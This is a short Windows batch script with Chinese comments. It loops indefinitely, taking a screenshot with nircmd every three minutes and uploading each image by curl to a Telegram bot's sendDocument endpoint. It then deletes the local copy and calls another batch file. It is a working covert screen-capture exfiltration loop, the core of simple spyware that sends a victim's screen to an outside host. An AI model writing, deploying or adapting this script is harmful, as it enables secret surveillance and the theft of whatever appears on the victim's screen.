@echo off
:start
setlocal
set "FILENAME=xy.jpg"
::首先，你需要下载nircmd。链接下载：http://www.nirsoft.net/utils/nircmd.html ::下载后，解压文件并将nircmd.exe放在项目目录中
echo Taking a screenshot...
nircmd.exe savescreenshot %FILENAME%

:: 等待3s，以确保截图已经完成
timeout /t 3 /nobreak >nul
:: 检查文件是否成功创建
if exist "%FILENAME%" (
    echo Sending photo...
    :: 使用curl发送截图到Telegram
    curl -F "chat_id=xxx" -F "document=@%OUTPUT_PATH%%FILENAME%" "https://api.telegram.org/botxxx/sendDocument"
    echo Photo deleted...
    del "%FILENAME%"
) else (    echo Screenshot failed or file not found.)
:: 执行yx.bat文件
call "C:\jp\yx.bat"
:: 等待后再次执行
timeout /t 180 /nobreak >nul
goto start